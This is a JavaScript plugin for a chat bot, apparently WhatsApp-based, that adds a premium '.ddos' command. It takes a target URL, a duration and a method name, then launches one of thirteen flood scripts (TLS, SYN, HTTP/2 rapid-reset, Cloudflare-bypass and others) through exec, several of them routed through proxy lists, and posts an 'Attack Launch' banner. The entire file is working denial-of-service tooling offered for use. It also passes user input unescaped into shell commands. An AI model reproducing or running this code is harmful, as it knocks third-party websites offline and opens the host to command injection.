import fetch from 'node-fetch';
import cp, { exec as _exec } from 'child_process';
import { promisify } from 'util';

const exec = promisify(_exec).bind(cp);
const cooldowns = new Map();

let handler = async (m, { conn, command, args }) => {
  if (args.length < 3) return conn.reply(m.chat, '*[🔎] .ddos <url> <duration> <methods> *', m);
  const user = m.sender;
  const cooldownTime = 60 * 1000;
  if (cooldowns.has(user)) {
    const remainingCooldown = cooldowns.get(user) - Date.now();
    if (remainingCooldown > 0) {
      return conn.reply(
        m.chat,
        `❌ Command is on cooldown. Please wait ${Math.ceil(remainingCooldown / 1000)} seconds.`,
        m
      );
    }
  }

  const blacklistedDomains = ['google.com', 'tesla.com', 'fbi.gov', 'youtube.com', 'lahelu.com'];

  if (blacklistedDomains.some(domain => args[0].includes(domain))) {
    return conn.reply(m.chat, '❌ Blacklisted Target.', m);
  }
  const target = args[0]
  const duration = args[1]
  const methods = args[2]
  const details = `╔═════╡Attack Launch╞╗    
╠ _*Target:*_ ${target}
╠ _*Duration:*_ ${duration}
╠ _*Methods:*_ ${methods}
╚═════════════════╝
#PermenMiscIsBack`

if ( methods === 'tls' ) {
conn.sendMessage(m.chat, { contextInfo: {
externalAdReply: {
showAdAttribution: true, 
title: `Attacking ${target}`,
body: `Launched`,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: `https://telegra.ph/file/f1a73ef83b86979b9c776.png`,
sourceUrl: ``
}}, text: details}, {quoted: m})
    cooldowns.set(user, Date.now() + cooldownTime);
	exec(`node StarXTls.cjs ${target} ${duration} 500 30`)
} else if ( methods === 'bomb' ) {     
conn.sendMessage(m.chat, { contextInfo: {
externalAdReply: {
showAdAttribution: true, 
title: `Attacking ${target}`,
body: `Launched`,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: `https://telegra.ph/file/f1a73ef83b86979b9c776.png`,
sourceUrl: ``
}}, text: details}, {quoted: m})
    cooldowns.set(user, Date.now() + cooldownTime);
	exec(`node StarXBomb.cjs ${target} ${duration} 100 30`)
} else if ( methods === 'ninja' ) {     
conn.sendMessage(m.chat, { contextInfo: {
externalAdReply: {
showAdAttribution: true, 
title: `Attacking ${target}`,
body: `Launched`,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: `https://telegra.ph/file/f1a73ef83b86979b9c776.png`,
sourceUrl: ``
}}, text: details}, {quoted: m})
    cooldowns.set(user, Date.now() + cooldownTime);
	exec(`node StarsXNinja.cjs ${target} ${duration}`)
} else if ( methods === 'bypass' ) {
conn.sendMessage(m.chat, { contextInfo: {
externalAdReply: {
showAdAttribution: true, 
title: `Attacking ${target}`,
body: `Launched`,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: `https://telegra.ph/file/f1a73ef83b86979b9c776.png`,
sourceUrl: ``
}}, text: details}, {quoted: m})
    cooldowns.set(user, Date.now() + cooldownTime);
	exec(`node StarXBypass GET ${target} ${duration} 64 2`)
} else if ( methods === 'cfb' ) {
conn.sendMessage(m.chat, { contextInfo: {
externalAdReply: {
showAdAttribution: true, 
title: `Attacking ${target}`,
body: `Launched`,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: `https://telegra.ph/file/f1a73ef83b86979b9c776.png`,
sourceUrl: ``
}}, text: details}, {quoted: m})
    cooldowns.set(user, Date.now() + cooldownTime);
	exec(`node StarXCFB.cjs ${target} ${duration} 40 proxy.txt`)
} else if ( methods === 'rapid-reset' ) {
conn.sendMessage(m.chat, { contextInfo: {
externalAdReply: {
showAdAttribution: true, 
title: `Attacking ${target}`,
body: `Launched`,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: `https://telegra.ph/file/f1a73ef83b86979b9c776.png`,
sourceUrl: ``
}}, text: details}, {quoted: m})
    cooldowns.set(user, Date.now() + cooldownTime);
	exec(`node StarXHttp2.cjs ${target} ${duration} 10 90 proxy.txt --reset true`)
} else if ( methods === 'https' ) {
conn.sendMessage(m.chat, { contextInfo: {
externalAdReply: {
showAdAttribution: true, 
title: `Attacking ${target}`,
body: `Launched`,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: `https://telegra.ph/file/f1a73ef83b86979b9c776.png`,
sourceUrl: ``
}}, text: details}, {quoted: m})
    cooldowns.set(user, Date.now() + cooldownTime);
	exec(`node StarXHttps.cjs ${target} ${duration}`)
} else if ( methods === 'mix' ) {
conn.sendMessage(m.chat, { contextInfo: {
externalAdReply: {
showAdAttribution: true, 
title: `Attacking ${target}`,
body: `Launched`,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: `https://telegra.ph/file/f1a73ef83b86979b9c776.png`,
sourceUrl: ``
}}, text: details}, {quoted: m})
    cooldowns.set(user, Date.now() + cooldownTime);
	exec(`node StarXMix.cjs ${target} 30 ${duration}`)
} else if ( methods === 'raw' ) {
conn.sendMessage(m.chat, { contextInfo: {
externalAdReply: {
showAdAttribution: true, 
title: `Attacking ${target}`,
body: `Launched`,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: `https://telegra.ph/file/f1a73ef83b86979b9c776.png`,
sourceUrl: ``
}}, text: details}, {quoted: m})
    cooldowns.set(user, Date.now() + cooldownTime);
	exec(`node StarXNuke.js ${target} ${duration}`)
} else if ( methods === 'syn' ) {
conn.sendMessage(m.chat, { contextInfo: {
externalAdReply: {
showAdAttribution: true, 
title: `Attacking ${target}`,
body: `Launched`,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: `https://telegra.ph/file/f1a73ef83b86979b9c776.png`,
sourceUrl: ``
}}, text: details}, {quoted: m})
    cooldowns.set(user, Date.now() + cooldownTime);
	exec(`node StarXSyn.cjs ${target} ${duration} 10 90 proxy.txt`)
} else if ( methods === 'flood' ) {
conn.sendMessage(m.chat, { contextInfo: {
externalAdReply: {
showAdAttribution: true, 
title: `Attacking ${target}`,
body: `Launched`,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: `https://telegra.ph/file/f1a73ef83b86979b9c776.png`,
sourceUrl: ``
}}, text: details}, {quoted: m})
    cooldowns.set(user, Date.now() + cooldownTime);
	 exec(`node StarXTls2.cjs ${target} ${duration} 100 20 proxy.txt ==input flood --referer rand`)
} else if ( methods === 'strike' ) {
conn.sendMessage(m.chat, { contextInfo: {
externalAdReply: {
showAdAttribution: true, 
title: `Attacking ${target}`,
body: `Launched`,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: `https://telegra.ph/file/f1a73ef83b86979b9c776.png`,
sourceUrl: ``
}}, text: details}, {quoted: m})
    cooldowns.set(user, Date.now() + cooldownTime);
	exec(`node StarXBypass2.cjs GET ${target} ${duration} 20 50 proxy.txt --full --randrate`);
} else if ( methods === 'bot-fight' ) {
conn.sendMessage(m.chat, { contextInfo: {
externalAdReply: {
showAdAttribution: true, 
title: `Attacking ${target}`,
body: `Launched`,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: `https://telegra.ph/file/f1a73ef83b86979b9c776.png`,
sourceUrl: ``
}}, text: details}, {quoted: m})
    cooldowns.set(user, Date.now() + cooldownTime);
	exec(`node StarXBypass2.cjs GET ${target} ${duration} 20 90 proxy.txt --bfm true --randrate --full --legit --http mix`);
} else {
	m.reply(`_*Unknown Methods*_`)
}
  }


handler.help = ['ddos'].map(v => v + ' <url> <duration>');
handler.tags = ['tools', 'attack'];
handler.premium = true
handler.command = /^(ddos)$/i;

export default handler;
